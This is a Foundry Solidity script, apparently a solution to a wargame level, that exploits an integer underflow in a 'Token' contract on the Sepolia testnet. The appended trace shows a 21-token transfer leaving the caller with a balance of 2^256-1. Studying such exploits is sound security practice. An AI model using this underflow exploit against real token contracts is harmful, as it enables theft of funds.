// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract TokenSolution is Script {

    Token public tokenInstance = Token(0xFB9CaC6A3C935E2C3BbBF4BaAe2A84BC32a341E1);

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        tokenInstance.transfer(address(0),21);
        console.log("My balance", tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }
}

/*Traces:
  [42884] TokenSolution::run()
    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::startBroadcast(<pk>)
    │   └─ ← [Return]
    ├─ [27568] 0xFB9CaC6A3C935E2C3BbBF4BaAe2A84BC32a341E1::transfer(0x0000000000000000000000000000000000000000, 21)
    │   └─ ← [Return] true
    ├─ [0] VM::envAddress("MY_ADDRESS") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [421] 0xFB9CaC6A3C935E2C3BbBF4BaAe2A84BC32a341E1::balanceOf(0x06714e8c7641d35Bb3613af5E9e214C138707Bf5) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] console::log("My balance", 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return]
    └─ ← [Stop]


Script ran successfully.

== Logs ==
  My balance 115792089237316195423570985008687907853269984665640564039457584007913129639935

## Setting up 1 EVM.
==========================
Simulated On-chain Traces:

  [27568] 0xFB9CaC6A3C935E2C3BbBF4BaAe2A84BC32a341E1::transfer(0x0000000000000000000000000000000000000000, 21)
    └─ ← [Return] true


==========================

Chain 11155111

Estimated gas price: 0.001000024 gwei

Estimated total gas used for script: 67542

Estimated amount required: 0.000000067543621008 ETH */